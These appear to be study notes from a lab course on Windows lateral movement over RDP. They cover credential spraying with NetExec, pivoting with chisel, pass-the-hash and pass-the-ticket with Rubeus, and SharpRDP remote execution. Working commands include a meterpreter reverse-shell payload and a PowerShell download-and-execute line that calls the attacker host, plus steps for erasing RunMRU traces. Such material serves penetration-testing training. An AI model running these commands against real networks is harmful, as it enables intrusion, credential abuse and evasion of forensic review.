# Windows Lateral Movement

## Introduction

Lateral Movement refers to the techniques you use to move through a network after gaining initial access. By understanding lateral movement, attackers and defenders can better navigate and secure networks. This knowledge allows defenders to implement more effective security measures and helps attackers identify and exploit weaknesses in network defenses, ultimately leading to a more robust and resilient security posture.

It involves moving from one system to another within a network, often with the goal of escalating privileges or accessing sensitive data. Using lateral movement techniques, you can move deeper into a network in search of credentials, sensitive data, and other high-value assets.

To perform a lateral movement, you need any form of credentials, including passwords, hashes, tickets, SSH keys, and session cookies. You can leverage those to connect to a remote computer in the network. Effective lateral movement requires a deep understanding of network architectures and the ability to identify services and protocols you can leverage to execute code on remote systems.

### Networks & Systems

Understanding how networks and systems work is crucial to performing lateral movement. Your initial step is to identify or map the network devices that you can target; you can do that through port scanning, ping sweep, or using AD information.

Once you understand the network, you need to be aware that some systems may be out of reach because of network segmentation or firewall restrictions. In those cases, you need to think outside the box to get access to those services.

#### Direct Lateral Movement

... is where you can execute commands directly on the target machine and force the target machine to connect back to you. For example, if you compromise SRV01 and need to move laterally to SRV02, you can use PSExec from SRV01 to execute commands on SRV02 and obtain a session or shell on SRV02.

![windows lateral movement 1](../../../images/windows_lateral_movement1.png)

#### Indirect Lateral Movement

... involves executing commands on the target machine when it receives instructions from another system. For example, suppose you can't reach SRV02 directly from SRV01 due to a network firewall restriction, but SRV02 can connect to the Windows Update Server. In this case, if you compromise the WSUS server and create a fake Windows Update that executes your desired command, once SRV02 retrieves the update, it will run your malicious update, allowing you to obtain a shell on SRV02.

![windows lateral movement 2](../../../images/windows_lateral_movement2.png)

### Network Segmentation


Understanding network segmentation is crucial for effectively performing lateral movement as attackers. Network segmentation involves dividing a network into smaller, isolated segments to limit the spread of an attack. Proper network segmentation can:

- **Contain breaches**: Restrict your movement and reduce the attack surface.
- **Enhance monitoring**: Allow for more focused and effective monitoring of network traffic.
- **Improve access control**: Enforce strict access policies between different segments.

![windows lateral movement 3](../../../images/windows_lateral_movement3.png)

In the above image, you can see a high-level overview of the network topology. There are three network segments, and the device that determines which network can reach the other is the Switch Layer 3. In other networks, this device can be a router, a Linux server, or a firewall. Understanding how these devices control communication between segments is essential for planning lateral movement.

## Remote Services

### RDP

#### Rights

The required rights to connect to RDP depend on the configuration; by default, only members of the `Administrators` or `Remote Desktop Users` groups can connect via RDP. Additionally, an administrator can grant specific users or groups rights to connect to RDP. Because those rights are set locally, the only way to enumerate them is if you have administrative rights on the target computer.

#### Enum

To use RDP for lateral movement you need to be aware if RDP is present on the environment you are testing, you can use nmap or any other network enumeration tool to search for port 3389 and once you get a list of targets, you can use that list with tools such as NetExec to test multiple credentials.

```bash
d41y@htb[/htb]$ netexec rdp 10.129.229.0/24 -u helen -p 'RedRiot88' -d inlanefreight.local
RDP         10.129.229.242  3389   DC01             [*] Windows 10 or Windows Server 2016 Build 17763 (name:DC01) (domain:DC01) (nla:True)
RDP         10.129.229.244  3389   SRV01            [*] Windows 10 or Windows Server 2016 Build 17763 (name:SRV01) (domain:SRV01) (nla:True)
RDP         10.129.229.242  3389   DC01             [-] inlanefreight.local\helen:RedRiot88 (STATUS_LOGON_FAILURE)
RDP         10.129.229.244  3389   SRV01            [+] inlanefreight.local\helen:RedRiot88 (Pwn3d!)
...SNIP...
```

You can confirm Helen has RDP rights on SRV01. Remeber that `Pwn3d!` doesn't mean you have administrative rights on the target machine but that you have rights to connect to RDP.

#### Lateral Movement from Windows

To connect to RDP from Windows you can use the default Windows Remote Desktop Connection client that can be accessed running `mstsc` on Run, CMD, or PowerShell.

```
C:\Tools> mstsc.exe
```

This will open a client where you can specify the target IP address or domain name, and one you click `Connect`, it will prompt you for the credentials.

![windows lateral movement 4](../../../images/windows_lateral_movement4.png)

Here are some actions that can be efficiently executed using RDP:

- File Transfer
- Running Applications
- Printing
- Audio and Video Streaming
- Clipboard Sharing

#### Lateral Movement from Linux

To connect to RDP from Linux, you can use the `xfreerdp` command-line tool.

```bash
d41y@htb[/htb]$ xfreerdp /u:Helen /p:'RedRiot88' /d:inlanefreight.local /v:10.129.229.244 /dynamic-resolution /drive:.,linux
```

By running this command in the terminal, you can establish an RDP connection to the specified Windows machine and perform similar actions as you would using the Windows Remote Desktop Connection client.

##### Optimizing xfreerdp for Low Latency Networks or Proxy Connections

```bash
d41y@htb[/htb]$ xfreerdp /u:Helen /p:'RedRiot88' /d:inlanefreight.local /v:10.129.229.244 /dynamic-resolution /drive:.,linux /bpp:8 /compression -themes -wallpaper /clipboard /audio-mode:0 /auto-reconnect -glyph-cache
```

- `/bpp:8`: Reduces the color depth to 8 bits per pixel, decreasing the amount of data transmitted.
- `/compression`: Enables compression to reduce the amount of data sent over the network.
- `-themes`: Disables desktop themes to reduce graphical data.
- `-wallpaper`: Disables the desktop wallpaper to further reduce graphical data.
- `/clipboard`: Enables clipboard sharing between the local and remote machines.
- `/audio-mode:0`: Disables audio redirection to save bandwidth.
- `/auto-reconnect`: Automatically reconnects if the connection drops, improving session stability.
- `-glyph-cache`: Enables caching of glyphs (text characters) to reduce the amount of data sent for text rendering.

Using these options helps to optimize the performance of the RDP session, ensuring a smoother experience even in less-than-ideal network conditions.

#### Restricted Admin Mode

... is a security feature introduced by Microsoft to mitigate the risk of credential theft over RDP connections. When enabled, it performs a network logon rather than an interactive logon, preventing the caching of credentials on the remote systems. This mode only applies to administrators, so it cannot be used when you log on to a remote computer with a non-admin account.

Although this mode prevents the caching of credentials, if enabled, it allows the execution of PtH or PtT for lateral movement.

To confirm if `Restricted Admin Mode` is enabled, you can query the following registry key:

```
C:\Tools> reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin
```

The value of `DisableRestrictedAdmin` indicates the status of `Restricted Admin Mode`:

- 0 means enabled
- 1 means disabled

If the key does not exist it means that it is disabled; you will see the following error message:

```
C:\Tools> reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin

ERROR: The system was unable to find the specified registry key or value.
```

Additionally, to enable `Restricted Admin Mode`, you would set the `DisableRestrictedAdmin` value to `0`:

```
C:\Tools> reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /d 0 /t REG_DWORD
```

And to disable `Restricted Admin Mode`, set the `DisableRestrictedAdmin` value to `1`:

```
C:\Tools> reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /d 1 /t REG_DWORD
```

#### Pivoting

It is common that you will need to use pivoting to perform lateral movement.

You will need to configure a SOCKS5 proxy on port 1080 in the `/etc/proxychains.conf` file:

```bash
d41y@htb[/htb]$ cat /etc/proxychains.conf | grep -Ev '(^#|^$)' | grep socks
socks5 127.0.0.1 1080
```

Next, on your Linux machine, you will initiate reverse port forwarding server:

```bash
d41y@htb[/htb]$ ./chisel server --reverse 
2024/03/28 07:09:08 server: Reverse tunnelling enabled
2024/03/28 07:09:08 server: Fingerprint AKOstLSoSTPQPp2PVEALM6z9Jx0IQVEEmO7bOSan1s4=
2024/03/28 07:09:08 server: Listening on http://0.0.0.0:8080
2024/03/28 07:10:49 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```

Then, in SRV01, you will connect to the server with the following command: `chisel.exe client <VPN IP> R:socks`

```powershell
PS C:\Tools> .\chisel.exe client 10.10.14.207:8080 R:socks
2024/03/28 06:10:48 client: Connecting to ws://10.10.14.207:8080
2024/03/28 06:10:49 client: Connected (Latency 137.6381ms)
```

#### PtH and PtT

Once you confirm `Restricted Admin Mode` is enabled, or if you can enable it, you can proceed to perform PtH or PtT attacks with RDP.

To perform PtH from a Linux machine, you can use `xfreerdp` with the `/pth` option to use a hash and connect to RDP.

```bash
d41y@htb[/htb]$ proxychains4 -q xfreerdp /u:helen /pth:62EBA30320E250ECA185AA1327E78AEB /d:inlanefreight.local /v:172.20.0.52
[13:11:55:443] [84886:84887] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[13:11:55:444] [84886:84887] [WARN][com.freerdp.crypto] - CN = SRV02.inlanefreight.local
```

For PtT you can use Rubeus. You will forge a ticket using Helen's hash. First you need to launch a sacrificial process with the option `createnetonly`:

```powershell
PS C:\Tools> .\Rubeus.exe createnetonly /program:powershell.exe /show
```

In the new PowerShell window you will use Helen's hash to forge a TGT:

```powershell
PS C:\Tools> .\Rubeus.exe asktgt /user:helen /rc4:62EBA30320E250ECA185AA1327E78AEB /domain:inlanefreight.local /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.2

[*] Action: Ask TGT

[*] Using rc4_hmac hash: 62EBA30320E250ECA185AA1327E78AEB
[*] Building AS-REQ (w/ preauth) for: 'inlanefreight.local\helen'
[*] Using domain controller: fe80::711d:1399:b85a:50c5%9:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFrjCCBaqgAwIBBaEDAgEWooIEsTCCBK1hggSpMIIEpaADAgEFoRUbE0lOTEFORUZSRUlHSFQuTE9D
      ...SNIP...

[+] Ticket successfully imported!
...SNIP...
```

From the window where you imported the ticket, you can use the `mstsc /restrictedAdmin` command:

```powershell
PS C:\Tools> mstsc.exe /restrictedAdmin
```

It will open a window as the currently logged-in user. It doesn't matter if the name is not the same as the account you are trying to impersonate.

![windows lateral movement 5](../../../images/windows_lateral_movement5.png)

When you click login, it will allow you to connect to RDP using the hash:

![windows lateral movement 6](../../../images/windows_lateral_movement6.png)

#### SharpRDP

... is a .NET tool that allows for non-graphical, authenticated remote command execution through RDP, leveraging the `mstscax.dll` library used by RDP clients. This tool can perform actions such as connecting, authenticating, executing commands, and disconnecting without needing a GUI client or SOCKS proxy.

SharpRDP relies on the terminal services library and generates the required DLLs from the `mstscax.dll`. It uses an invisible Windows form to handle the terminal services connection object instantiation and perform actions needed for lateral movement.

You will use Metasploit and PowerShell to execute commands on the target machine. In your Linux machine you will execute Metasploit to listen on port 8888:

```bash
d41y@htb[/htb]$ msfconsole -x "use multi/handler;set payload windows/x64/meterpreter/reverse_https; set LHOST 10.10.14.207; set LPORT 8888; set EXITONSESSION false; set EXITFUNC thread; run -j"
```

Then you will generate a payload with msfvenom using PowerShell reflection:

```bash
d41y@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.207 LPORT=8888 -f psh-reflection -o s
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 774 bytes
Final size of psh-reflection file: 3543 bytes
Saved as: s
```

Next you use Python http server to host your payload:

```bash
d41y@htb[/htb]$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Now you can use SharpRDP to execute a PowerShell command to execute your payload and provide a session:

```powershell
PS C:\Tools> .\SharpRDP.exe computername=srv01 command="powershell.exe IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.207/s')" username=inlanefreight\helen password=RedRiot88
[+] Connected to          :  srv01
[+] Execution priv type   :  non-elevated
[+] Executing powershell.exe iex(new-object net.webclient).downloadstring('http://10.10.14.207/s')
[+] Disconnecting from    :  srv01
[+] Connection closed     :  srv01
```

> [!NOTE]
> The execution of commands of SharpRDP is limited to 259 chars.

SharpRDP uses Microsoft Terminal Services to execute commands, leaving traces of command execution within the `RunMRU` registry key (_`HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` or `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU`_). You can use [CleanRUNMR](https://github.com/0xthirteen/CleanRunMRU) to clean all command records. To compile the tool, you can use the built-in Microsoft `csc` compiler tool. First, transfer CleanRunMRU's `Program.cs` file from your attack host to the target computer:

```powershell
PS C:\Tools> wget -Uri http://10.10.14.207/CleanRunMRU/CleanRunMRU/Program.cs -OutFile CleanRunMRU.cs
```

Now you can use `csc.exe` to compile it:

```powershell
PS C:\Tools> C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe .\CleanRunMRU.cs
Microsoft (R) Visual C# Compiler version 4.7.3190.0
for C# 5
Copyright (C) Microsoft Corporation. All rights reserved.

This compiler is provided as part of the Microsoft (R) .NET Framework, but only supports language versions up to C# 5, which is no longer the latest version. For compilers that support newer versions of the C# programming language, see http://go.microsoft.com/fwlink/?LinkID=533240
```

Now you can use `CleanRunMRU.exe` to clear all commands:

```powershell
PS C:\Tools> .\CleanRunMRU.exe  clearall
HKCU:Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
[+] Cleaned all RunMRU values
```

#### Advantages

RDP provides several advantages for lateral movement, making it a preferred method for attackers in certain scenarios. Some of the key advantages include:

- **Evade detection**: RDP traffic is common in business environments, making it less likely to raise suspicion.
- **Non-Admin Access**: RDP access does not necessarily require administrative rights; a non-admin user can also have RDP access.
- **Persistent Access**: Once a foothold is established, RDP can provide persistent access to the network.

